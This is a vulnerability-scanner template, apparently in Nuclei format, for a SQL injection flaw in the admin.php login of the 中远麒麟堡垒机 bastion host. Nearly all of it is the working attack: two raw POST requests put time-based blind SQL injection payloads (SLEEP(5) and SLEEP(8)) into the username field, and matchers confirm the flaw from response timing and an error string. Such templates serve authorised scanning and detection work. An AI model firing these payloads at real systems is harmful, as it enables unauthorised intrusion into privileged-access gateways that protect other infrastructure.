id: poc-yaml-zyql-bastion-host-admin-php-sqli
info:
  name: "中远麒麟堡垒机 admin.php 存在 SQL 注入漏洞"
  author: ProjectDiscoveryAI
  severity: high
  tags: 中远麒麟堡垒机

http:
  - raw:
      - |
        POST /admin.php?controller=admin_commonuser HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/x-www-form-urlencoded

        username=admin' AND (SELECT 12 FROM (SELECT(SLEEP(5)))ptGN) AND 'AAdm'='AAdm
      - |
        POST /admin.php?controller=admin_commonuser HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/x-www-form-urlencoded

        username=admin' AND (SELECT 12 FROM (SELECT(SLEEP(8)))ptGN) AND 'AAdm'='AAdm
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        part: body
        words:
          - "username and password does not match!"
      - type: dsl
        dsl:
          - 'duration_1>=5 && duration_1<=6'
          - 'duration_2 - duration_1 >2'
        condition: and
